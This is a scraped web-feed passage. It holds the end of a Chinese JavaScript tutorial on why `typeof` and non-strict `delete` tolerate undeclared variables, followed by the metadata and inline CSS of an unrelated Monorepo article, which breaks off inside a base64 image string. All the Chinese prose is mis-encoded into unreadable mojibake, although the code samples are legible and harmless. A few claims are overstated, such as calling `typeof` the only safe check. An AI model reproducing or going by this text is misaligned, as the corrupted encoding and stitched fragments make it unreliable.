<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-symbol">ReferenceError:</span> name <span class="hljs-built_in">is</span> <span class="hljs-built_in">not</span> defined
</code></pre>
<p>ä½†æ˜¯ï¼Œä½¿ç”¨ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">typeof name<span class="hljs-comment">;</span>
delete name<span class="hljs-comment">;</span>
</code></pre>
<p>å´ä¸ä¼šæŠ¥é”™ï¼Œè¿™ç»™äº†æˆ‘ä»¬ä¸€ç§â€œå®‰å…¨æ¢æµ‹å˜é‡æ˜¯å¦å­˜åœ¨â€çš„èƒ½åŠ›ã€‚<br/>
æœ¬æ–‡å°†æ·±å…¥è§£é‡ŠåŸå› ã€åŸç†ï¼Œå¹¶æä¾›æœ€ä½³å®è·µç¤ºä¾‹ã€‚</p>
<hr/>
<h3 data-id="heading-1">äºŒã€è¯­è¨€è®¾è®¡åŸç†ï¼šä¸ºä»€ä¹ˆ typeof ä¸ä¼šæŠ› ReferenceErrorï¼Ÿ</h3>
<h4 data-id="heading-2"><strong>1. JavaScript åˆæœŸçš„è®¾è®¡ç›®æ ‡</strong></h4>
<p>JS åœ¨ 1995 å¹´è®¾è®¡æ—¶ï¼Œéœ€è¦ï¼š</p>
<ul>
<li>å…è®¸â€œå¼±é”™è¯¯â€å¹¶ç»§ç»­æ‰§è¡Œ</li>
<li>éä¸“ä¸šç¨‹åºå‘˜ä¹Ÿèƒ½ä¸Šæ‰‹</li>
<li>æœ‰åˆ©äºå®¹é”™ï¼ˆæµè§ˆå™¨è„šæœ¬ä¸èƒ½è½»æ˜“å´©æºƒæ•´ä¸ªé¡µé¢ï¼‰</li>
</ul>
<p>å› æ­¤ <code>typeof</code> è¢«ç‰¹æ„è®¾è®¡ä¸º <strong>æ°¸è¿œä¸ä¼šå› ä¸ºæœªå£°æ˜å˜é‡è€ŒæŠ›é”™</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-3">ä¸‰ã€typeof çš„åº•å±‚è¡Œä¸ºæœºåˆ¶</h3>
<h4 data-id="heading-4"><strong>1. ECMAScript è§„èŒƒï¼šæ£€æŸ¥å˜é‡ä¹‹å‰ä¸è§¦å‘ ReferenceError</strong></h4>
<p>ä¼ªæµç¨‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">if</span> (å˜é‡å£°æ˜å­˜åœ¨)
    è¿”å›å…¶ç±»å‹å­—ç¬¦ä¸²
<span class="hljs-keyword">else</span>
    è¿”å› <span class="hljs-string">"undefined"</span>
</code></pre>
<p>è¿™æ„å‘³ç€ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">typeof</span> name; <span class="hljs-comment">// "undefined"ï¼Œå³ä½¿ name æœªå£°æ˜ï¼Œä¹Ÿä¸ä¼šæŠ¥é”™</span>
</code></pre>
<p>ç¤ºä¾‹ï¼ˆå¸¦é€è¡Œæ³¨é‡Šï¼‰ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç¤ºä¾‹ï¼šæ£€æµ‹ä¸€ä¸ªå¯èƒ½ä¸å­˜åœ¨çš„å˜é‡</span>
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> userProfile !== <span class="hljs-string">"undefined"</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å˜é‡å­˜åœ¨ï¼Œå¯ä½¿ç”¨:"</span>, userProfile);
} <span class="hljs-keyword">else</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å˜é‡ä¸å­˜åœ¨"</span>);
}
</code></pre>
<p><strong>é€è¡Œè§£é‡Šï¼š</strong></p>
<ul>
<li><code>typeof userProfile</code> ä¸ä¼šè§¦å‘é”™è¯¯</li>
<li>è‹¥å˜é‡æœªå£°æ˜ â†’ è¿”å›å­—ç¬¦ä¸² <code>"undefined"</code></li>
<li>å› æ­¤æ¡ä»¶åˆ¤æ–­å®‰å…¨å¯é </li>
</ul>
<hr/>
<h3 data-id="heading-5">å››ã€delete ä¸ºä»€ä¹ˆä¹Ÿä¸ä¼šæŠ¥é”™ï¼Ÿ</h3>
<p><code>delete</code> çš„ä¸»è¦ä½œç”¨æ˜¯åˆ é™¤å¯¹è±¡å±æ€§ï¼Œè€Œä¸æ˜¯å˜é‡ã€‚</p>
<p>ä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">delete</span> <span class="hljs-variable language_">window</span>.<span class="hljs-property">a</span>;
<span class="hljs-keyword">delete</span> obj.<span class="hljs-property">key</span>;
</code></pre>
<p>å¦‚æœåˆ é™¤ä¸€ä¸ªä¸å­˜åœ¨çš„å˜é‡æˆ–å±æ€§ï¼Œè§„èŒƒè¦æ±‚ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">åˆ é™¤å¤±è´¥ â†’ è¿”å› <span class="hljs-literal">false</span>ï¼ˆä¸¥æ ¼æ¨¡å¼æŠ¥é”™ï¼‰
åˆ é™¤æˆåŠŸ â†’ è¿”å› <span class="hljs-literal">true</span>
</code></pre>
<p>ä½†éä¸¥æ ¼æ¨¡å¼ä¸‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">delete</span> name; <span class="hljs-comment">// name æœªå£°æ˜ â†’ è¿”å› trueï¼Œä¸æŠ¥é”™</span>
</code></pre>
<p>è¿™æ˜¯ä¸ºäº†æµè§ˆå™¨è„šæœ¬çš„å®¹é”™è®¾è®¡ã€‚</p>
<hr/>
<h3 data-id="heading-6">äº”ã€å¦‚ä½•åˆ©ç”¨ typeof åˆ¤æ–­å˜é‡æ˜¯å¦å­˜åœ¨ï¼Ÿï¼ˆæ¨èç”¨æ³•ï¼‰</h3>
<h4 data-id="heading-7"><strong>é€šç”¨å†™æ³•</strong></h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> someVar !== <span class="hljs-string">"undefined"</span>) {
    <span class="hljs-comment">// å®‰å…¨ä½¿ç”¨è¯¥å˜é‡</span>
}
</code></pre>
<h4 data-id="heading-8">ç¤ºä¾‹ï¼šæ ¹æ®å…¨å±€å˜é‡åˆ‡æ¢è¿è¡Œæ¨¡å¼</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// è‹¥ globalConfig å­˜åœ¨ï¼Œä¼˜å…ˆä½¿ç”¨</span>
<span class="hljs-type">const</span> config = (typeof globalConfig !== <span class="hljs-string">"undefined"</span>)
    ? globalConfig
    : { debug: <span class="hljs-literal">false</span>, mode: <span class="hljs-string">"default"</span> };

console.<span class="hljs-built_in">log</span>(config);
</code></pre>
<p><strong>é€è¡Œè§£é‡Šï¼š</strong></p>
<ul>
<li>å®‰å…¨æ£€æŸ¥å˜é‡æ˜¯å¦å£°æ˜</li>
<li>è‹¥å­˜åœ¨åˆ™ä½¿ç”¨</li>
<li>è‹¥ä¸å­˜åœ¨ä¸æŠ¥é”™å¹¶ä½¿ç”¨é»˜è®¤é…ç½®</li>
</ul>
<hr/>
<h3 data-id="heading-9">å…­ã€ä¸è¦ä½¿ç”¨ try...catch åˆ¤æ–­å˜é‡æ˜¯å¦å­˜åœ¨ï¼ˆåä¾‹ï¼‰</h3>
<p>é”™è¯¯ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">let exists<span class="hljs-comment">;</span>

try {
    name<span class="hljs-comment">; // name æœªå£°æ˜</span>
    <span class="hljs-attr">exists</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
} catch {
    <span class="hljs-attr">exists</span> = <span class="hljs-literal">false</span><span class="hljs-comment">;</span>
}
</code></pre>
<p>è™½ç„¶å¯è¡Œï¼Œä½†æ•ˆç‡ä½ã€ä¸ä¼˜é›…ï¼Œä¹Ÿä¸ç¬¦åˆ JS è®¾è®¡åˆè¡·ã€‚<br/>
<code>typeof</code> æ‰æ˜¯å®˜æ–¹æ¨èçš„æ–¹å¼ã€‚</p>
<hr/>
<h3 data-id="heading-10">ä¸ƒã€å¯¹æ¯”ï¼šå£°æ˜ä½†å€¼ä¸º undefined ä¸æœªå£°æ˜å˜é‡çš„åŒºåˆ«</h3>
<h4 data-id="heading-11"><strong>1. å˜é‡å£°æ˜ä½†æœªèµ‹å€¼</strong></h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">let</span> a;
<span class="hljs-keyword">typeof</span> a; <span class="hljs-comment">// "undefined"</span>
</code></pre>
<h4 data-id="heading-12"><strong>2. æ ¹æœ¬æœªå£°æ˜å˜é‡</strong></h4>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">typeof</span> <span class="hljs-selector-tag">b</span>; <span class="hljs-comment">// "undefined" â€”â€” ä¸æŠ¥é”™</span>
<span class="hljs-selector-tag">b</span>;        <span class="hljs-comment">// ReferenceError â€”â€” æŠ¥é”™</span>
</code></pre>
<p>è¡¨æ ¼åŒºåˆ†ï¼š</p>




















<table><thead><tr><th>æƒ…å†µ</th><th>typeof ç»“æœ</th><th>ç›´æ¥è®¿é—®</th></tr></thead><tbody><tr><td>å·²å£°æ˜ä½†æœªèµ‹å€¼</td><td>"undefined"</td><td>å€¼ä¸º undefined</td></tr><tr><td>æœªå£°æ˜å˜é‡</td><td>"undefined"</td><td>ReferenceError</td></tr></tbody></table>
<p>å› æ­¤ï¼Œ<strong>åªæœ‰ typeof èƒ½åŒºåˆ†å®‰å…¨è®¿é—®ä¸ç›´æ¥è®¿é—®çš„åŒºåˆ«</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-13">å…«ã€å†æ‰©å±•ï¼šæ£€æµ‹å…¨å±€å˜é‡çš„å¦ä¸€ç§å®‰å…¨æ–¹å¼</h3>
<p>åœ¨æµè§ˆå™¨å…¨å±€ä½œç”¨åŸŸä¸­ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span> (<span class="hljs-string">"Vue"</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">window</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Vue å·²åŠ è½½"</span>);
}
</code></pre>
<p>ä½†æ˜¯æ­¤æ–¹æ³•ä¸èƒ½åˆ¤æ–­å±€éƒ¨å˜é‡æ˜¯å¦å­˜åœ¨ï¼Œå› æ­¤<br/>
<strong>typeof æ˜¯æœ€ä¸‡èƒ½ã€é€‚ç”¨æ‰€æœ‰ä½œç”¨åŸŸçš„æ–¹å¼</strong>ã€‚</p>
<hr/>
<h3 data-id="heading-14">ä¹ã€æ½œåœ¨é—®é¢˜ä¸æ³¨æ„äº‹é¡¹</h3>
<h4 data-id="heading-15">âŒ ä¸è¦ç”¨ typeof null åˆ¤æ–­å¯¹è±¡ç±»å‹</h4>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">typeof</span> <span class="hljs-literal">null</span>; <span class="hljs-comment">// "object" â€”â€” å†å²é—ç•™ bug</span>
</code></pre>
<h4 data-id="heading-16">âŒ typeof ä¸èƒ½åˆ¤æ–­å˜é‡æ˜¯å¦å·²åˆå§‹åŒ–ï¼ˆTDZ é—®é¢˜ï¼‰</h4>
<p>åœ¨ ES6 çš„å—çº§ä½œç”¨åŸŸä¸­ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">console.log(typeof x)<span class="hljs-comment">; // âŒ ReferenceError (åœ¨ TDZ ä¸­)</span>
let <span class="hljs-attr">x</span> = <span class="hljs-number">10</span><span class="hljs-comment">;</span>
</code></pre>
<p>åªæœ‰<strong>å®Œå…¨æœªå£°æ˜</strong>æ‰ä¸ä¼šæŠ¥é”™ã€‚</p>
<h4 data-id="heading-17">âŒ delete ä¸é€‚åˆä½œä¸ºå˜é‡å­˜åœ¨æ€§æ£€æŸ¥</h4>
<p><code>delete</code> çš„è¯­ä¹‰æ˜¯åˆ é™¤å±æ€§ï¼Œä¸æ˜¯æ£€æµ‹å˜é‡ï¼Œä¹Ÿä¸ä¿è¯è·¨ä½œç”¨åŸŸä¸€è‡´æ€§ã€‚</p>
<hr/>
<h2 data-id="heading-18">åã€æ€»ç»“è¦ç‚¹</h2>
<ul>
<li><code>typeof</code> æ°¸è¿œä¸ä¼šå› ä¸ºæœªå£°æ˜å˜é‡è€ŒæŠ¥é”™</li>
<li>å®ƒæ˜¯ <strong>å”¯ä¸€å®‰å…¨åˆ¤æ–­å˜é‡æ˜¯å¦å­˜åœ¨çš„æ–¹å¼</strong></li>
<li><code>delete</code> åˆ é™¤ä¸å­˜åœ¨çš„å˜é‡åœ¨éä¸¥æ ¼æ¨¡å¼ä¸‹ä¸æŠ¥é”™</li>
<li>æ¨èæ£€æŸ¥å˜é‡å­˜åœ¨æ€§çš„æ–¹å¼ï¼š</li>
</ul>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> someVar !== <span class="hljs-string">"undefined"</span>) {
    <span class="hljs-comment">// safe</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-19">å®Œæ•´ç¤ºä¾‹ï¼šå¯ç›´æ¥è¿è¡Œ</h2>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkVar</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-comment">// å®‰å…¨æ¢æµ‹å˜é‡æ˜¯å¦å­˜åœ¨</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> <span class="hljs-variable language_">window</span>[name] !== <span class="hljs-string">"undefined"</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å˜é‡ <span class="hljs-subst">${name}</span> å­˜åœ¨ï¼Œå€¼ä¸ºï¼š`</span>, <span class="hljs-variable language_">window</span>[name]);
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å˜é‡ <span class="hljs-subst">${name}</span> ä¸å­˜åœ¨`</span>);
    }
}

<span class="hljs-comment">// æµ‹è¯•</span>
<span class="hljs-title function_">checkVar</span>(<span class="hljs-string">"abc"</span>);  <span class="hljs-comment">// æœªå£°æ˜å˜é‡ï¼Œä¸æŠ¥é”™</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-property">abc</span> = <span class="hljs-number">123</span>;
<span class="hljs-title function_">checkVar</span>(<span class="hljs-string">"abc"</span>);  <span class="hljs-comment">// å˜é‡å·²ç»å­˜åœ¨</span>
</code></pre>
<hr/>
<h2 data-id="heading-20">âœ¨ æœ¬æ–‡ç»“è¯­</h2>
<p>æœ¬æ–‡éƒ¨åˆ†å†…å®¹å€ŸåŠ© AI è¾…åŠ©ç”Ÿæˆï¼Œå¹¶ç”±ä½œè€…æ•´ç†å®¡æ ¸ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸ§­ 2025 å¹´ã€Œå¤§å‰ç«¯ Monorepo æ¶æ„ã€æœ€ä½³å®è·µæŒ‡å—]]></title>    <link>https://juejin.cn/post/7581676787380928531</link>    <guid>https://juejin.cn/post/7581676787380928531</guid>    <pubDate>2025-12-10T01:54:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581676787380928531" data-draft-id="7581738974424498195" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸ§­ 2025 å¹´ã€Œå¤§å‰ç«¯ Monorepo æ¶æ„ã€æœ€ä½³å®è·µæŒ‡å—"/> <meta itemprop="keywords" content="å‰ç«¯,å‰ç«¯æ¡†æ¶,å‰ç«¯å·¥ç¨‹åŒ–"/> <meta itemprop="datePublished" content="2025-12-10T01:54:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸ§­ 2025 å¹´ã€Œå¤§å‰ç«¯ Monorepo æ¶æ„ã€æœ€ä½³å®è·µæŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:54:43.000Z" title="Wed Dec 10 2025 01:54:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMgAAADICAMAAACahl6sAAAAQlBMVEVHcEwlRnqtZBj76q4lRnolRnolRnolRnolRnokRnr/gGtrVUeLXDBKTl+hYSHasW7Ik0zs0JG4dCvUdEE0SW+rYxrLQJfjAAAACnRSTlMA////0H/xUaMi5MCoTwAACfVJREFUeNrtnQl3qygUgJ9GXAqosfL//+pgmgXwXmRNJGdu55xO+6rx8+6I8O9fehmGriN93zdN07bVXdpW/ih/SbpuGP6dXbpOXv7z2i3S9ISck2eQOnAhMHG64VQQbmrAaM4B05GmipaGdB+m6BNQPBXzMYtKR3EPbB/RS5eY4g+lIW9WBqnySCvVMrzRpqqs0g9nwVg5p1KYlHEchRT5bftp+y3n6xlQDjAkABtrKULU9f377ev+4/1/NiT+URRiZRhrcZP6WLa/Gq005BORaqXsdYEuHPIP798ZxSyt6d5sVfxJESRCsvB32lfXwhRjnUBGmKXNoJQe04VIASJqRC/9G7yDsyQMiloYz+0pHYghEoPISAGgpDSvHsCoMwmA0mfjSG5UOsqah2RodkljzMkhZZdamiEDB8+Nsbk9T04yGNljDXGOZZ6u0+Tj9DuvbyNJBuPO0ABtLNPlJtfZJ4CNNCWJoY8gddwxNpm9YrHh9DEkBoeMud4Kma8XRZaYpBJOYvg59U9wOsblMvmGrzQe30dyqFZ1dxPfO0FT5BOdw989THVs4q1TFk+iN4PMu7CaLpd4EJOExNaJLE4d0xQKYpJ0cY5Ozcwwu6WOu2cs9TUYxPB4b4fvLRzTUXbT1HH7y0BnB0j6CAehkPFfFzd1TMsi6sU1/P4VM9NiISHBlYnBMR+kad075sXlmMehj1twnfTUqJH4GJfqIKte7S72emPnHbdiYHIB0e6ATjKq1UoTaFh6wBL2csMIVo9fH/v6QRHAgoxrOHQQxG/36tC1ODmGOeBGBRmXalgcdhDQ1xF1vI6a3DF2d4r7G1enOUgNOshlFq7qUCxrca9ldiCam7ilxRbP6JbOYsYtfLFmkcXEgLG1DN/6eroxHjqh5bh+Uw27e1oWVK7pN+AqwzUcq/UYTPw8nWufLFBHN2zcxLRYlmGPs6rA2Wy0uJe/E7TknbHIa1WH1bLA8DAj3JpxET+FCNCWZ5uNT6jxTPZK/1mXoCBeKlGLRT2lP69XN3XdqqCojKX1ZVda6iD2McjeXSHa0I+AHd2InGAJgjRVM6gOBfygDrarRJnho6eQBbrns+HkcNUCWtYClJa66qFgPbqqZEBTCOAgRqxCOhQBWpZeIC6QBq91hEoI5unTjsMsK9DCFigY9WNn19hgVCrELalrTw6WnYMYzjHhQ2/7G2xTx1HvwpzSe4cVi5ORQQwMW9+72FU5L4gGsa6Yu1RcDeIhs64Qs8izt0vGH+n9/IKaIlYpM2